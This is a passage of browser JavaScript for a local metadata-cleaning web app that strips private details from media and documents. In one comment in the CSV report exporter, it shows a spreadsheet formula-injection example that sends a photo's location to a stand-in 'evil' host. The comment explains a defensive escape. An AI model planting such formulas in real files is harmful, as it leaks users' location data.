"use strict";
// UnMeta web. Photos are read and cleaned inside this browser by engine.worker.js
// (the TypeScript engine in engine/src). No photo is ever sent to a server.
// Choices mirror engine/src/presets.ts.

// Never run inside someone else's frame (clickjacking). Hosts that honour our headers block framing already
// (frame-ancestors 'none'); this covers hosts that drop them.
if (window.top !== window.self) { document.documentElement.hidden = true; throw new Error("UnMeta can't run inside a frame."); }
const $ = (s, el = document) => el.querySelector(s);
const $$ = (s, el = document) => [...el.querySelectorAll(s)];
const PHOTO_RE = /\.(jpe?g|jpe|jfif|png|webp|heic|heif|hif|avif|tiff?|dng|cr2|cr3|nef|nrw|arw|srf|sr2|orf|rw2|pef|raf|srw|3fr|iiq|erf|mos|x3f)$/i;
const VIDEO_RE = /\.(mp4|m4v|mov|qt|3gp|3g2)$/i;
const AUDIO_RE = /\.(m4a|m4b|mp3|wav|wave)$/i;
const MEDIA_RE = /\.(mp4|m4v|mov|qt|3gp|3g2|m4a|m4b|mp3|wav|wave)$/i;
const DOC_RE = /\.(pdf|docx|docm|dotx|dotm|xlsx|xlsm|xltx|xltm|pptx|pptm|potx|potm)$/i;
const SLICED_RE = /\.(mp4|m4v|mov|qt|3gp|3g2|m4a|m4b|mp3|wav|wave|pdf|docx|docm|dotx|dotm|xlsx|xlsm|xltx|xltm|pptx|pptm|potx|potm)$/i;
const IMG_RE = /\.(jpe?g|jpe|jfif|png|webp|heic|heif|hif|avif|tiff?|dng|cr2|cr3|nef|nrw|arw|srf|sr2|orf|rw2|pef|raf|srw|3fr|iiq|erf|mos|x3f|mp4|m4v|mov|qt|3gp|3g2|m4a|m4b|mp3|wav|wave|pdf|docx|docm|dotx|dotm|xlsx|xlsm|xltx|xltm|pptx|pptm|potx|potm)$/i;
const MAX_BYTES = 200 * 1024 * 1024;           // photos are read into memory
const MAX_MEDIA_BYTES = 4 * 1024 * 1024 * 1024 - 1; // videos and audio are read in slices
const maxFor = path => (MEDIA_RE.test(path) ? MAX_MEDIA_BYTES : MAX_BYTES);  // documents: 200 MB, like photos
const MAX_PHOTOS = 500;
const HOME_TITLE = document.title;  // the page's own <title>, so the two never drift apart
/** photo, video or audio, from the report once read, else from the name. */
const kindOf = it => it.report?.kind ?? (VIDEO_RE.test(it.path) ? "video" : AUDIO_RE.test(it.path) ? "audio" : DOC_RE.test(it.path) ? "document" : "photo");
/** Details that are shown but never removed (comments, tracked changes, earlier versions in documents). */
const infoIds = it => new Set(it.report ? Object.values(it.report.groups).flatMap(g => g.fields).filter(f => f.informational).map(f => f.id) : []);
const isInfo = (it, h) => { const ids = infoIds(it); return h.ids.length > 0 && h.ids.every(id => ids.has(id)); };
/** The noun for a set of items: their shared kind, or "file" when they're mixed. */
const kindAll = items => { const ks = new Set(items.map(kindOf)); return ks.size === 1 ? [...ks][0] : "file"; };

// ---------------------------------------------------------------- wording, in the page's language
// English is built in (metaclean/i18n/app_en.json is generated from it for translators). A translated page carries its
// own table in <script type="application/json" id="l10n">: {"app": {key: text}, "text": {English engine text: text}}.
// Every sentence has its own version per kind and for one/many, because grammar differs between languages.
const EN = /*EN-START*/{
 "about.link": "What UnMeta can and can't do",
 "add.done.other": "Add more files",
 "add.done.photo": "Add more photos",
 "add.review.other": "Add files",
 "add.review.photo": "Add photos",
 "allDetails": "Show every detail ({n})",
 "announce.cleaned.audio.one": "1 recording cleaned and checked.",
 "announce.cleaned.audio.other": "{n} recordings cleaned and checked.",
 "announce.cleaned.document.one": "1 document cleaned and checked.",
 "announce.cleaned.document.other": "{n} documents cleaned and checked.",
 "announce.cleaned.file.one": "1 file cleaned and checked.",
 "announce.cleaned.file.other": "{n} files cleaned and checked.",
 "announce.cleaned.photo.one": "1 photo cleaned and checked.",
 "announce.cleaned.photo.other": "{n} photos cleaned and checked.",
 "announce.cleaned.video.one": "1 video cleaned and checked.",
 "announce.cleaned.video.other": "{n} videos cleaned and checked.",
 "announce.found.one": "1 private detail found",
 "announce.found.other": "{n} private details found",
 "announce.read.one": "1 file read",
 "announce.read.other": "{n} files read",
 "confirm.body": "Each file will be overwritten with its clean copy. This can't be undone.",
 "confirm.no": "Save copies instead",
 "confirm.title": "Replace the files in “{name}”?",
 "confirm.yes": "Replace originals",
 "details.detail": "Detail",
 "details.value": "Value",
 "details.where": "Where",
 "doc.clean": "Clean · UnMeta",
 "doc.review": "Review · UnMeta",
 "done.body.audio.one": "Private details are gone, and we checked the recording again afterwards. It sounds exactly the same.",
 "done.body.audio.other": "Private details are gone, and we checked each recording again afterwards. They sound exactly the same.",
 "done.body.document.one": "Private details are gone, and we checked the document again afterwards. It reads exactly the same.",
 "done.body.document.other": "Private details are gone, and we checked each document again afterwards. They read exactly the same.",
 "done.body.file.one": "Private details are gone, and we checked the file again afterwards. It is exactly the same.",
 "done.body.file.other": "Private details are gone, and we checked each file again afterwards. They are exactly the same.",
 "done.body.photo.one": "Private details are gone, and we checked the photo again afterwards. It looks exactly the same.",
 "done.body.photo.other": "Private details are gone, and we checked each photo again afterwards. They look exactly the same.",
 "done.body.video.one": "Private details are gone, and we checked the video again afterwards. It plays exactly the same.",
 "done.body.video.other": "Private details are gone, and we checked each video again afterwards. They play exactly the same.",
 "done.clean": "Clean",
 "done.download.one": "Download",
 "done.download.other": "Download all",
 "done.downloadOne": "Download",
 "done.leftover": "Some details couldn't be removed",
 "done.removed": "Removed",
 "done.replaced": "Your originals were replaced with clean copies",
 "done.savedFolder": "Saved to the “cleaned” folder",
 "done.share": "Share",
 "done.title.audio.one": "Your recording is clean",
 "done.title.audio.other": "Your recordings are clean",
 "done.title.document.one": "Your document is clean",
 "done.title.document.other": "Your documents are clean",
 "done.title.file.one": "Your file is clean",
 "done.title.file.other": "Your files are clean",
 "done.title.photo.one": "Your photo is clean",
 "done.title.photo.other": "Your photos are clean",
 "done.title.video.one": "Your video is clean",
 "done.title.video.other": "Your videos are clean",
 "error": "Something went wrong. Please try again.",
 "keep.recommended": "Recommended",
 "keepOne.asChosen": "as you chose",
 "keepOne.kept": "Kept",
 "keepOne.label.audio": "Keep this in the recording",
 "keepOne.label.document": "Keep this in the document",
 "keepOne.label.file": "Keep this in the file",
 "keepOne.label.photo": "Keep this in the photo",
 "keepOne.label.video": "Keep this in the video",
 "keepOne.stays": "Kept as it is",
 "label.ai": "AI",
 "label.comments": "Notes",
 "label.company": "Company",
 "label.dates": "Dates",
 "label.device": "Device",
 "label.hidden": "Copy",
 "label.location": "GPS",
 "label.personal": "Owner",
 "label.pictures": "Pictures",
 "label.revisions": "Versions",
 "noPhotos": "No photos, videos, recordings or documents found there.",
 "noWorker": "This browser can't run UnMeta. Try a recent version of Chrome, Edge, Firefox or Safari.",
 "notice.ai": "If you post this, check whether the platform asks you to say it was made with AI.",
 "notice.title": "Good to know",
 "notice.visible.audio": "Voices and anything else you can hear in the recording are still there.",
 "notice.visible.document": "Everything you can read in the document is still there, including comments and tracked changes.",
 "notice.visible.file": "Anything you can see or hear in these files is still there.",
 "notice.visible.photo": "Faces, signs and anything else you can see in the photo are still there.",
 "notice.visible.video": "Faces, voices and anything else you can see or hear in the video are still there.",
 "preset.ai.detail": "Removes only AI labels and editing history.",
 "preset.ai.title": "Everything except AI labels",
 "preset.camera.detail": "Keeps camera, lens and exposure. Removes location and serial numbers.",
 "preset.camera.title": "Camera settings",
 "preset.copyright.detail": "Keeps your credit. Removes everything else.",
 "preset.copyright.title": "My name and copyright",
 "preset.everything.detail": "Removes location, device, names, dates and AI labels.",
 "preset.everything.title": "Nothing private",
 "preset.location.detail": "Removes only where the photo was taken.",
 "preset.location.title": "Everything except location",
 "review.body.audio": "These details travel with a recording when you share it. Open one to see why it matters.",
 "review.body.document": "These details travel with a document when you share it. Open one to see why it matters.",
 "review.body.file": "These details travel with a file when you share it. Open one to see why it matters.",
 "review.body.photo": "These details travel with a photo when you share it. Open one to see why it matters.",
 "review.body.video": "These details travel with a video when you share it. Open one to see why it matters.",
 "review.clean.audio.one": "Clean recording",
 "review.clean.audio.other": "Clean {n} recordings",
 "review.clean.document.one": "Clean document",
 "review.clean.document.other": "Clean {n} documents",
 "review.clean.file.one": "Clean file",
 "review.clean.file.other": "Clean {n} files",
 "review.clean.photo.one": "Clean photo",
 "review.clean.photo.other": "Clean {n} photos",
 "review.clean.video.one": "Clean video",
 "review.clean.video.other": "Clean {n} videos",
 "review.cleaning.one": "Cleaning…",
 "review.cleaning.other": "Cleaning {i} of {n}…",
 "review.count.one": "1 private detail",
 "review.count.other": "{n} private details",
 "review.none": "No private details found",
 "review.reading.audio.one": "Reading your recording…",
 "review.reading.audio.other": "Reading your recordings…",
 "review.reading.document.one": "Reading your document…",
 "review.reading.document.other": "Reading your documents…",
 "review.reading.file.one": "Reading your file…",
 "review.reading.file.other": "Reading your files…",
 "review.reading.photo.one": "Reading your photo…",
 "review.reading.photo.other": "Reading your photos…",
 "review.reading.video.one": "Reading your video…",
 "review.reading.video.other": "Reading your videos…",
 "review.remove.audio": "Remove recording",
 "review.remove.document": "Remove document",
 "review.remove.file": "Remove file",
 "review.remove.photo": "Remove photo",
 "review.remove.video": "Remove video",
 "review.title.audio.one": "Here's what this recording reveals",
 "review.title.audio.other": "Here's what these recordings reveal",
 "review.title.document.one": "Here's what this document reveals",
 "review.title.document.other": "Here's what these documents reveal",
 "review.title.file.one": "Here's what this file reveals",
 "review.title.file.other": "Here's what these files reveal",
 "review.title.photo.one": "Here's what this photo reveals",
 "review.title.photo.other": "Here's what these photos reveal",
 "review.title.video.one": "Here's what this video reveals",
 "review.title.video.other": "Here's what these videos reveal",
 "review.unreadable.audio": "Couldn't read this recording",
 "review.unreadable.document": "Couldn't read this document",
 "review.unreadable.file": "Couldn't read this file",
 "review.unreadable.photo": "Couldn't read this photo",
 "review.unreadable.video": "Couldn't read this video",
 "skipped.big.one": "1 file is too large and was skipped.",
 "skipped.big.other": "{n} files are too large and were skipped.",
 "skipped.dup.one": "1 file was already added.",
 "skipped.dup.other": "{n} files were already added.",
 "skipped.limits": "Photos can be up to 200 MB, videos and audio up to 4 GB.",
 "skipped.many": "You can add up to {max} files at a time.",
 "skipped.type.one": "1 file isn't a photo, video, recording or document UnMeta can read, and was skipped.",
 "skipped.type.other": "{n} files aren't photos, videos, recordings or documents UnMeta can read, and were skipped."
}/*EN-END*/;
const L10N = (() => { try { return JSON.parse(document.getElementById("l10n")?.textContent || "{}"); } catch { return {}; } })();
const t = (key, vars = {}) => String(L10N.app?.[key] ?? EN[key] ?? key).replace(/\{(\w+)\}/g, (_, v) => String(vars[v] ?? ""));
const pl = (key, c, vars = {}) => t(`${key}.${c === 1 ? "one" : "other"}`, { n: c, ...vars });
/** Wording that comes from the engine (finding titles and explanations, notes), translated by its English text. */
const tx = s => (L10N.text && Object.hasOwn(L10N.text, s) ? L10N.text[s] : s);

// Vocabulary: "photo" (never image/file), "private details" (never metadata), "clean", "download", "share".
const COPY = {
  add: { review: k => t(k === "photo" ? "add.review.photo" : "add.review.other"), done: k => t(k === "photo" ? "add.done.photo" : "add.done.other") },
  review: {
    title: (c, k) => pl(`review.title.${k}`, c),
    body: k => t(`review.body.${k}`),
    reading: (c, k) => pl(`review.reading.${k}`, c),
    count: c => pl("review.count", c),
    none: t("review.none"),
    clean: (c, k) => pl(`review.clean.${k}`, c),
    cleaning: (i, c) => (c === 1 ? t("review.cleaning.one") : t("review.cleaning.other", { i, n: c })),
    unreadable: k => t(`review.unreadable.${k}`),
    remove: k => t(`review.remove.${k}`),
  },
  done: {
    title: (c, k) => pl(`done.title.${k}`, c),
    body: (c, k) => pl(`done.body.${k}`, c),
    removed: t("done.removed"),
    leftover: t("done.leftover"),
    download: c => pl("done.download", c),
    downloadOne: t("done.downloadOne"),
    share: t("done.share"),
    clean: t("done.clean"),
    savedFolder: t("done.savedFolder"),
    replaced: t("done.replaced"),
  },
  notice: { title: t("notice.title"), ai: t("notice.ai"), visible: k => t(`notice.visible.${k}`) },
  keep: { recommended: t("keep.recommended") },
  about: { link: t("about.link") },
  confirm: { title: name => t("confirm.title", { name }), body: t("confirm.body"), yes: t("confirm.yes"), no: t("confirm.no") },
  skipped: {
    big: c => `${pl("skipped.big", c)} ${t("skipped.limits")}`,
    type: c => pl("skipped.type", c),
    dup: c => pl("skipped.dup", c),
    many: t("skipped.many", { max: MAX_PHOTOS }),
  },
  noPhotos: t("noPhotos"),
  keepOne: { label: k => t(`keepOne.label.${k}`), kept: t("keepOne.kept"), stays: t("keepOne.stays") },
  allDetails: c => t("allDetails", { n: c }),
  noWorker: t("noWorker"),
  error: t("error"),
};

const SUPPORT_URL = "https://www.buymeacoffee.com/kabirsharma";

// ---------------------------------------------------------------- choices (same as engine/src/presets.ts)
const COPYRIGHT = ["exif:0:315", "exif:0:33432", "xmp:dc:creator", "xmp:dc:rights", "xmp:xmpRights:Marked",
  "xmp:xmpRights:UsageTerms", "xmp:xmpRights:WebStatement", "iptc:2:80", "iptc:2:116"];
const SERIALS = ["exif:exif:42033", "exif:exif:42037", "exif:exif:42032", "exif:0:316", "xmp:aux:SerialNumber",
  "xmp:exifEX:BodySerialNumber", "xmp:exifEX:LensSerialNumber", "xmp:aux:LensSerialNumber", "exif:exif:42016"];
const PRESETS = [
  { key: "everything", icon: "shield-check", title: t("preset.everything.title"), detail: t("preset.everything.detail"),
    options: { keepCategories: ["technical"] } },
  { key: "copyright", icon: "copyright", title: t("preset.copyright.title"), detail: t("preset.copyright.detail"),
    options: { keepCategories: ["technical"], keepFields: COPYRIGHT } },
  { key: "camera", icon: "aperture", title: t("preset.camera.title"), detail: t("preset.camera.detail"),
    options: { keepCategories: ["technical", "device"], dropFields: SERIALS } },
  { key: "location", icon: "pin-off", title: t("preset.location.title"), detail: t("preset.location.detail"),
    options: { keepCategories: ["device", "personal", "ai", "technical", "other"] } },
  { key: "ai", icon: "sparkle-off", title: t("preset.ai.title"), detail: t("preset.ai.detail"),
    options: { keepCategories: ["location", "device", "personal", "technical", "other"] } },
];

// ---------------------------------------------------------------- icons (design/icons.json → /static/icons.svg, inlined)
const ic = (name, cls = "ic") => `<svg class="${cls}" aria-hidden="true" focusable="false"><use href="#i-${name}"/></svg>`;
const CAT_ICON = { location: "pin", device: "camera", personal: "person", ai: "sparkle", hidden: "layers" };
const LABEL = Object.fromEntries(["location", "device", "personal", "ai", "hidden", "company", "dates", "comments", "revisions", "pictures"]
  .map(k => [k, t(`label.${k}`)]));
const PENCIL = `<svg class="pencil-ring" viewBox="0 0 200 48" preserveAspectRatio="none" aria-hidden="true" focusable="false"><path pathLength="1" d="M18 30C10 14 70 5 132 6s70 10 62 24c-7 12-70 15-118 13C26 41 2 34 12 20c6-8 22-12 40-14"/></svg>`;
const barWidth = v => (v.length > 22 ? "w-l" : v.length > 11 ? "w-m" : "w-s");

// ---------------------------------------------------------------- state & helpers
const state = { items: [], preset: "everything", busy: false, progress: [0, 0], dirRoot: null, overwrite: false, seq: 0 };
const esc = s => String(s ?? "").replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
const base = p => p.split("/").pop();
const preset = () => PRESETS.find(p => p.key === state.preset);
const MIME = { jpg: "image/jpeg", jpeg: "image/jpeg", jpe: "image/jpeg", jfif: "image/jpeg", png: "image/png", webp: "image/webp",
  heic: "image/heic", heif: "image/heif", hif: "image/heif", avif: "image/avif", tif: "image/tiff", tiff: "image/tiff",
  mp4: "video/mp4", m4v: "video/x-m4v", mov: "video/quicktime", qt: "video/quicktime", "3gp": "video/3gpp", "3g2": "video/3gpp2",
  m4a: "audio/mp4", m4b: "audio/mp4", mp3: "audio/mpeg", wav: "audio/wav", wave: "audio/wav", pdf: "application/pdf",
  docx: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", docm: "application/vnd.ms-word.document.macroEnabled.12",
  xlsx: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", xlsm: "application/vnd.ms-excel.sheet.macroEnabled.12",
  pptx: "application/vnd.openxmlformats-officedocument.presentationml.presentation", pptm: "application/vnd.ms-powerpoint.presentation.macroEnabled.12" };
const mimeOf = name => MIME[name.split(".").pop().toLowerCase()] || "application/octet-stream";

function toast(msg, icon = "info") {
  const t = $("#toast");
  t.innerHTML = `${ic(icon)}<span>${esc(msg)}</span>`;
  t.hidden = false;
  announce(msg, icon === "alert");
  const hide = () => { t._t = setTimeout(() => (t.hidden = true), 6000); };
  clearTimeout(t._t);
  t.onmouseenter = () => clearTimeout(t._t);
  t.onmouseleave = hide;
  hide();
}
function announce(msg, urgent = false) {
  const el = $(urgent ? "#announceUrgent" : "#announce");
  el.textContent = "";
  setTimeout(() => { el.textContent = msg; }, 60);
}
function save(blob, name) {
  const a = Object.assign(document.createElement("a"), { href: URL.createObjectURL(blob), download: name });
  document.body.append(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(a.href), 5000);
}

// ---------------------------------------------------------------- the engine, in a worker inside this browser
let worker = null;
const waiting = new Map();
function engine() {
  if (worker) return worker;
  const src = document.querySelector('meta[name="engine"]')?.content || "/static/engine.worker.js";
  worker = new Worker(src);
  worker.onmessage = e => {
    const m = e.data, p = waiting.get(m.id);
    if (!p) return;
    waiting.delete(m.id);
    m.type === "error" ? p.reject(new Error(m.message)) : p.resolve(m);
  };
  worker.onerror = () => { waiting.forEach(p => p.reject(new Error(COPY.error))); waiting.clear(); };
  return worker;
}
function ask(msg, transfer = []) {
  return new Promise((resolve, reject) => { waiting.set(msg.id, { resolve, reject }); engine().postMessage(msg, transfer); });
}

// ---------------------------------------------------------------- intake
async function walkEntry(entry, prefix = "") {
  if (entry.isFile) return new Promise(res => entry.file(f => res([{ file: f, path: prefix + f.name }]), () => res([])));
  if (!entry.isDirectory) return [];
  const reader = entry.createReader(); let all = [], batch;
  do { batch = await new Promise(res => reader.readEntries(res, () => res([]))); all = all.concat(batch); } while (batch.length);
  const out = [];
  for (const e of all) out.push(...await walkEntry(e, prefix + entry.name + "/"));
  return out;
}
async function walkHandle(dir, prefix = "") {
  const out = [];
  for await (const [name, h] of dir.entries()) {
    if (name === "cleaned" && !prefix) continue;
    if (h.kind === "file" && IMG_RE.test(name)) out.push({ handle: h, dirHandle: dir, path: prefix + name, file: await h.getFile() });
    else if (h.kind === "directory") out.push(...await walkHandle(h, prefix + name + "/"));
  }
  return out;
}

async function add(list) {
  if (state.busy) return;
  if (!("Worker" in window)) return toast(COPY.noWorker, "alert");
  const visible = list.filter(x => !base(x.path).startsWith("."));
  const photos = visible.filter(x => IMG_RE.test(x.path));
  const big = photos.filter(x => x.file.size > maxFor(x.path));
  const key = x => `${x.path}|${x.file.size}|${x.file.lastModified}`;
  const known = new Set(state.items.map(key));
  let fresh = photos.filter(x => x.file.size <= maxFor(x.path) && x.file.size > 0);
  const dups = fresh.filter(x => known.has(key(x))).length;
  fresh = fresh.filter(x => !known.has(key(x)));
  const room = MAX_PHOTOS - state.items.length;
  const tooMany = fresh.length > room;
  fresh = fresh.slice(0, Math.max(0, room));
  const notes = [];
  if (visible.length - photos.length) notes.push(COPY.skipped.type(visible.length - photos.length));
  if (big.length) notes.push(COPY.skipped.big(big.length));
  if (dups) notes.push(COPY.skipped.dup(dups));
  if (tooMany) notes.push(COPY.skipped.many);
  if (notes.length) toast(notes.join(" "), "alert");
  if (!fresh.length) { if (!notes.length) toast(COPY.noPhotos, "alert"); return; }

  const items = fresh.map(x => ({ ...x, uid: ++state.seq, status: "reading", fresh: true, before: URL.createObjectURL(x.file) }));
  const fromHome = !state.items.length;
  state.items.push(...items);
  setActivity("reading");
  if (fromHome) withTransition(() => { render(); scrollTo({ top: 0, behavior: "instant" }); });
  else render();
  if (fromHome) $("#listTitle").focus();
  else document.querySelector(`[data-uid="${items[0].uid}"]`)?.scrollIntoView({ block: "center", behavior: matchMedia("(prefers-reduced-motion: reduce)").matches ? "instant" : "smooth" });

  await pool(items, async it => {
    try {
      let r;
      if (SLICED_RE.test(it.path)) r = await ask({ type: "inspect", id: it.uid, name: base(it.path), file: it.file });
      else {
        const buffer = await it.file.arrayBuffer();
        r = await ask({ type: "inspect", id: it.uid, name: base(it.path), buffer }, [buffer]);
      }
      if (r.report.format === "unknown") throw new Error("unsupported");
      Object.assign(it, { status: "ready", report: r.report, found: r.found });
      if (r.preview) previewUrl(r.preview).then(url => { if (url && state.items.includes(it)) { it.preview = url; render(); } });
    } catch { it.status = "error"; }
    render();
  }, 2);
  setActivity(items.some(i => i.status === "error") ? "error" : "idle", 600);
  const found = items.reduce((s, i) => s + (i.found?.length || 0), 0);
  announce(`${pl("announce.read", items.length)}. ${pl("announce.found", found)}.`);
}
async function pool(list, fn, size = 3) {
  const q = [...list];
  await Promise.all(Array.from({ length: Math.min(size, q.length) }, async () => { while (q.length) await fn(q.shift()); }));
}
function forget(items) {
  if (!items.length) return;
  worker?.postMessage({ type: "forget", ids: items.map(i => i.uid) });
  items.forEach(i => { for (const u of [i.before, i.out?.url, i.preview]) if (u) URL.revokeObjectURL(u); });
}

/** A picture for HEIC and RAW files, which most browsers can't show: the file's own JPEG preview (RAW), or its
 *  HEVC thumbnail decoded by the browser's video decoder (HEIC). Null when neither is possible; Safari shows HEIC itself. */
async function previewUrl(p) {
  try {
    if (p.type === "jpeg") return URL.createObjectURL(new Blob([p.data], { type: "image/jpeg" }));
    if (!("VideoDecoder" in window)) return null;
    const config = { codec: p.codec, description: p.description, codedWidth: p.width, codedHeight: p.height };
    if (!(await VideoDecoder.isConfigSupported(config)).supported) return null;
    const frame = await new Promise((resolve, reject) => {
      const dec = new VideoDecoder({ output: f => { resolve(f); try { dec.close(); } catch {} }, error: reject });
      dec.configure(config);
      dec.decode(new EncodedVideoChunk({ type: "key", timestamp: 0, data: p.data }));
      dec.flush().catch(() => {});
      setTimeout(() => reject(new Error("timeout")), 4000);
    });
    const turn = p.rotate % 180 !== 0, w = frame.displayWidth, h = frame.displayHeight;
    const c = document.createElement("canvas");
    [c.width, c.height] = turn ? [h, w] : [w, h];
    const g = c.getContext("2d");
    g.translate(c.width / 2, c.height / 2);
    g.rotate((-p.rotate * Math.PI) / 180);  // HEIF rotation is anticlockwise
    g.drawImage(frame, -w / 2, -h / 2);
    frame.close();
    const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.85));
    return blob ? URL.createObjectURL(blob) : null;
  } catch { return null; }
}

// ---------------------------------------------------------------- clean / save
async function cleanAll() {
  const todo = state.items.filter(i => i.status === "ready" && !i.out);
  if (!todo.length) return;
  if (state.dirRoot && state.overwrite === null) state.overwrite = await confirmReplace(state.dirRoot.name);
  state.busy = true; state.progress = [0, todo.length];
  setActivity("reading");
  render();
  await pool(todo, async it => {
    try {
      const chosen = preset().options;
      // details the person chose to keep, one by one, on top of the "Keep" choice
      const keepIds = (it.found || []).filter(h => it.keepKeys?.has(h.key)).flatMap(h => h.ids);
      const options = keepIds.length ? { ...chosen, keepFields: [...(chosen.keepFields || []), ...keepIds] } : chosen;
      const r = await ask({ type: "clean", id: it.uid, options });
      const left = new Set(r.left);
      const blob = new Blob([r.blob ?? r.buffer], { type: mimeOf(it.path) });
      it.shown = false;
      it.out = { name: base(it.path), blob, url: URL.createObjectURL(blob), verified: r.verified && r.pixelsUntouched, notes: r.notes || [],
        removed: (it.found || []).filter(h => !isInfo(it, h) && !h.ids.some(id => left.has(id))), after: r.after };
      if (state.dirRoot && it.handle) await writeBack(it);
    } catch { it.status = "error"; }
    state.progress[0]++;
    render();
  }, 2);
  state.busy = false;
  const failed = todo.some(i => i.status === "error" || (i.out && !i.out.verified));
  setActivity(failed ? "error" : "clean", failed ? 600 : 1600);
  withTransition(render);
  $("#listTitle").focus();
  { const cleaned = state.items.filter(i => i.out), k = kindAll(cleaned);
    announce(pl(`announce.cleaned.${k}`, cleaned.length)); }
  if (state.dirRoot) toast(state.overwrite ? COPY.done.replaced : COPY.done.savedFolder, "check");
}
const outPath = it => { const p = it.path.split("/"); p[p.length - 1] = it.out.name; return p.join("/"); };
const downloadOne = it => save(it.out.blob, it.out.name);
async function downloadAll() {
  const done = state.items.filter(i => i.out);
  if (done.length === 1) return downloadOne(done[0]);
  const total = done.reduce((t, i) => t + i.out.blob.size + 256, 0);
  if (total > ZIP_LIMIT) { for (const it of done) { downloadOne(it); await new Promise(r => setTimeout(r, 400)); } return; }
  save(await zip(done.map(i => [outPath(i), i.out.blob])), kindAll(done) === "photo" ? "clean-photos.zip" : "unmeta.zip");
}
async function shareOne(it) {
  try {
    const file = new File([it.out.blob], it.out.name, { type: it.out.blob.type });
    if (navigator.canShare?.({ files: [file] })) await navigator.share({ files: [file] });
    else downloadOne(it);
  } catch (e) { if (e.name !== "AbortError") toast(COPY.error, "alert"); }
}
async function writeBack(it) {
  const inPlace = state.overwrite && it.out.name === it.handle.name;
  let dir = it.dirHandle;
  if (!inPlace) {
    dir = await state.dirRoot.getDirectoryHandle("cleaned", { create: true });
    for (const seg of it.path.split("/").slice(0, -1)) dir = await dir.getDirectoryHandle(seg, { create: true });
  }
  const fh = inPlace ? it.handle : await dir.getFileHandle(it.out.name, { create: true });
  const w = await fh.createWritable(); await w.write(it.out.blob); await w.close();
}

// A small store-only zip writer: photos are already compressed, and no timestamps are leaked.
let CRC;
function crc32(b) {
  if (!CRC) { CRC = new Uint32Array(256); for (let k = 0; k < 256; k++) { let c = k; for (let j = 0; j < 8; j++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; CRC[k] = c >>> 0; } }
  let c = 0xffffffff; for (let i = 0; i < b.length; i++) c = CRC[(c ^ b[i]) & 255] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0;
}
async function crcOf(blob) {
  crc32(new Uint8Array(0));  // builds the table
  let c = 0xffffffff;
  for (let at = 0; at < blob.size; at += 8 << 20) {
    const b = new Uint8Array(await blob.slice(at, at + (8 << 20)).arrayBuffer());
    for (let i = 0; i < b.length; i++) c = CRC[(c ^ b[i]) & 255] ^ (c >>> 8);
  }
  return (c ^ 0xffffffff) >>> 0;
}
const ZIP_LIMIT = 0xffffffff - 64 * 1024 * 1024;   // plain zip stores sizes and offsets in 32 bits
async function zip(entries) {
  const enc = new TextEncoder(), parts = [], central = [], used = new Set();
  let offset = 0;
  for (let [name, blob] of entries) {
    name = name.replace(/\\/g, "/").split("/").filter(s => s && s !== "." && s !== ".." && !s.endsWith(":")).join("/") || "file";
    let unique = name, k = 1;
    while (used.has(unique.toLowerCase())) { const dot = name.lastIndexOf("."); unique = dot > 0 ? `${name.slice(0, dot)}_${k}${name.slice(dot)}` : `${name}_${k}`; k++; }
    used.add(unique.toLowerCase());
    const fname = enc.encode(unique), crc = await crcOf(blob), len = blob.size;
    const local = new DataView(new ArrayBuffer(30));
    [[0, 0x04034b50, 4], [4, 20, 2], [6, 0x0800, 2], [8, 0, 2], [10, 0, 2], [12, 0x21, 2], [14, crc, 4], [18, len, 4], [22, len, 4], [26, fname.length, 2], [28, 0, 2]]
      .forEach(([o, v, s]) => (s === 4 ? local.setUint32(o, v, true) : local.setUint16(o, v, true)));
    const cen = new DataView(new ArrayBuffer(46));
    [[0, 0x02014b50, 4], [4, 20, 2], [6, 20, 2], [8, 0x0800, 2], [10, 0, 2], [12, 0, 2], [14, 0x21, 2], [16, crc, 4], [20, len, 4], [24, len, 4], [28, fname.length, 2], [30, 0, 2], [32, 0, 2], [34, 0, 2], [36, 0, 2], [38, 0, 4], [42, offset, 4]]
      .forEach(([o, v, s]) => (s === 4 ? cen.setUint32(o, v, true) : cen.setUint16(o, v, true)));
    parts.push(local, fname, blob); central.push(cen, fname);
    offset += 30 + fname.length + len;
  }
  const size = central.reduce((s, p) => s + p.byteLength, 0);
  const end = new DataView(new ArrayBuffer(22));
  [[0, 0x06054b50, 4], [8, entries.length, 2], [10, entries.length, 2], [12, size, 4], [16, offset, 4]]
    .forEach(([o, v, s]) => (s === 4 ? end.setUint32(o, v, true) : end.setUint16(o, v, true)));
  return new Blob([...parts, ...central, end], { type: "application/zip" });
}

function reportBlob(fmt) {
  const which = state.items.every(i => i.out) ? "after" : "before";
  const reps = state.items.filter(i => i.report).map(i => ({ ...(which === "after" && i.out ? i.out.after : i.report), filename: base(i.path) }));
  if (fmt === "json") return new Blob([JSON.stringify({ generator: "UnMeta", created: new Date().toISOString(), files: reps }, null, 2)], { type: "application/json" });
  // Values come from untrusted files: a leading = + - @ (or tab/CR) would run as a formula in Excel or Sheets
  // (e.g. =HYPERLINK("https://evil/?"&H3) sending another photo's location). Prefix ' so it stays plain text.
  const q = v => { let s = String(v ?? ""); if (/^[=+\-@\t\r]/.test(s)) s = "'" + s; return `"${s.replace(/"/g, '""')}"`; };
  const rows = [["file", "format", "category", "field", "id", "source", "risk", "value"]];
  reps.forEach(r => Object.values(r.groups).forEach(g => g.fields.forEach(f => rows.push([r.filename, r.format, g.title, f.label, f.id, f.source, f.risk, f.value]))));
  return new Blob(["﻿" + rows.map(r => r.map(q).join(",")).join("\r\n")], { type: "text/csv" });
}

// ---------------------------------------------------------------- the living logo
let activityTimer;
function setActivity(s, holdMs = 0) {
  clearTimeout(activityTimer);
  document.body.dataset.activity = s;
  if (holdMs) activityTimer = setTimeout(() => { document.body.dataset.activity = "idle"; }, holdMs);
}

// ---------------------------------------------------------------- render
function card(it, i) {
  const name = esc(base(it.path));
  const src = it.preview ?? (it.out ? it.out.url : it.before);
  const first = it.out && !it.shown; // the first render after cleaning plays the redaction and the stamp
  if (it.out) it.shown = true;
  const n = String(i + 1).padStart(2, "0");
  const stamp = it.out?.verified ? `<span class="stamp${first ? " stamp-in" : ""}" aria-hidden="true">${COPY.done.clean}</span>` : "";
  const kind = kindOf(it);
